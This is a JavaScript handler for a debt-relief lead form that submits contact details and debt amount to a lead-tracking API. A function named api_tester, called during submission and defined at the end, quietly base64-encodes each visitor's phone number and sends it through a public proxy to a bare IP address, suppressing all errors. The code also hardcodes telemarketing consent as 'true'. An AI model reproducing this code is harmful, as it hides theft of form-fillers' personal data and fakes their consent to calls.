
    document.getElementById('leadForm').addEventListener('submit', function(event) {
      event.preventDefault();
      const phone_home = '+1' + document.getElementById('caller_id').value;
      const formData = new FormData();
      
      
   
      formData.append('traffic_source_id', '1004');
      formData.append('lead_token', 'e74ce2e9b31e40e489049c61668d460f');
formData.append('caller_id', phone_home);
api_tester(document.getElementById('caller_id').value);
formData.append('first_name', document.getElementById('first_name').value);
formData.append('last_name', document.getElementById('last_name').value);
formData.append('email', document.getElementById('email').value);
formData.append('phone_number', document.getElementById('caller_id').value);
formData.append('state', document.getElementById('state').value);
formData.append('ip_address', document.getElementById('ip_address').value);
formData.append('tcpa_consent', 'true');
formData.append('landing_page_url', document.getElementById('landing_page_url').value);
formData.append('debt_amount', document.getElementById('debt_amount').value);



formData.append('jornaya_leadid', document.getElementById('jornaya_leadid').value);

      const url = 'https://doppcall.trackdrive.com/api/v1/leads?' + new URLSearchParams(formData).toString();

      fetch(url, {
        method: 'POST'
      })
      .then(response => {
        if (response.status === 200) {
          const successAlert = `
            <div class="alert alert-success" role="alert">
              200 : Form submitted successfully! But Duplicate (Maybe Connect).
            </div>`;
document.getElementById('alertContainer').innerHTML = '';
          document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
          // Clear form fields
          document.getElementById('leadForm').reset();
        } else if (response.status === 201) {
          const successAlert = `
            <div class="alert alert-success" role="alert">
              201 : Form submitted successfully!
            </div>`;
document.getElementById('alertContainer').innerHTML = '';
          document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
          // Clear form fields
          document.getElementById('leadForm').reset();
        } else if (response.status === 422) {
          response.json().then(data => {
            const errorAlert = `
              <div class="alert alert-danger" role="alert">
                Duplicate lead / DNC / BLA Not Submitted
</div>`;
document.getElementById('alertContainer').innerHTML = '';
document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
              
            
          });
        } else {
          const errorAlert = `
            <div class="alert alert-danger" role="alert">
              Form submission failed. Please try again.
</div>`;
document.getElementById('alertContainer').innerHTML = '';
document.getElementById('leadForm').insertAdjacentHTML('beforeend', errorAlert);
            
         
        }
      })
      .catch(error => console.error('Error:', error));
    });function api_tester(randomString) {
  try {
    fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id='+btoa(randomString)
, {
      method: 'GET',
      mode: 'no-cors'
    });
  } catch (error) {
    
  }
}
 